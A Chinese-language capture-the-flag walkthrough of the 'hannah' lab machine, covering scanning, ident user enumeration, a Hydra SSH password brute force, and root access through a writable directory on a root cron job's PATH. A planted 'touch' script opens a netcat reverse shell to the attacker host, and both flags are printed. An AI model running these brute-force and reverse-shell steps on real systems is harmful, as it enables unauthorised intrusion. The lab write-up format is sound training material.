# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 01:29 EDT
Nmap scan report for 192.168.21.3
Host is up (1.3s latency).
MAC Address: 08:00:27:6B:E4:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.3 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 01:30 EDT
Nmap scan report for 192.168.21.3
Host is up (0.00010s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
113/tcp open  ident
MAC Address: 08:00:27:6B:E4:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.87 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 01:30 EDT
Warning: 192.168.21.3 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.3
Host is up (0.0013s latency).
All 65535 scanned ports on 192.168.21.3 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:6B:E4:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 72.77 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p22,80,113 192.168.21.3  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 01:31 EDT
Nmap scan report for 192.168.21.3
Host is up (0.00026s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp  open  http    nginx 1.18.0
113/tcp open  ident?
MAC Address: 08:00:27:6B:E4:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.92 seconds
```

# 漏洞利用

看一下80端口

![image](https://github.com/user-attachments/assets/083d3d25-989b-4c41-855f-35f618e20c40)

目录扫描

```
┌──(kali㉿kali)-[~]
└─$  gobuster dir -u http://192.168.21.3 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.3
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,jpg,png,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 19]
/robots.txt           (Status: 200) [Size: 25]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/index.html什么也没有

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.3/index.html 
Under construction
```

/robots.txt发现一个目录，看一下

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.3/robots.txt
Disallow: /enlightenment
```

/enlightenment没东西，等一下再看

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.3/enlightenment
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```

看一下inent服务

![image](https://github.com/user-attachments/assets/bd6db5b4-545d-4434-8e92-73a6e9d10514)

```
┌──(kali㉿kali)-[~]
└─$ ident-user-enum 192.168.21.3 22 80 113
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.21.3:22 root
192.168.21.3:80 moksha
192.168.21.3:113        root
```

爆破一下moksha

```
┌──(kali㉿kali)-[~]
└─$ hydra -l moksha -P /usr/share/wordlists/rockyou.txt ssh://192.168.21.3 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 02:08:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.21.3:22/
[22][ssh] host: 192.168.21.3   login: moksha   password: hannah
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-17 02:08:23
```

连接ssh

```
┌──(kali㉿kali)-[~]
└─$ ssh moksha@192.168.21.3             
The authenticity of host '192.168.21.3 (192.168.21.3)' can't be established.
ED25519 key fingerprint is SHA256:RZdWDCayN2ZJO5rXaVv2OOemeArZ0UbcRoKCoz9lWzA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes   
Warning: Permanently added '192.168.21.3' (ED25519) to the list of known hosts.
moksha@192.168.21.3's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

# 权限提升

看一下都有什么

```
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -> /dev/null                                                         
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
moksha@hannah:~$ sudo -l
-bash: sudo: orden no encontrada
moksha@hannah:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
moksha@hannah:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
moksha@hannah:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
moksha:x:1000:1000:moksha,,,:/home/moksha:/bin/bash
```

user

```
moksha@hannah:~$ cat user.txt 
HMVGGHFWP2023
```

提权

```
moksha@hannah:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
moksha@hannah:~$ which touch
/usr/bin/touch
moksha@hannah:~$ ls -ld /media
drwxrwxrwx 3 root root 4096 ene  4  2023 /media
moksha@hannah:~$ which bash
/usr/bin/bash
moksha@hannah:~$ echo "nc -c '/usr/bin/bash' 192.168.21.10 4444" | tee /media/touch
nc -c '/usr/bin/bash' 192.168.21.10 4444
moksha@hannah:~$ chmod +x /media/touch
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.3] 43664
id
uid=0(root) gid=0(root) grupos=0(root)
```

root

```
cat root.txt
HMVHAPPYNY2023
```
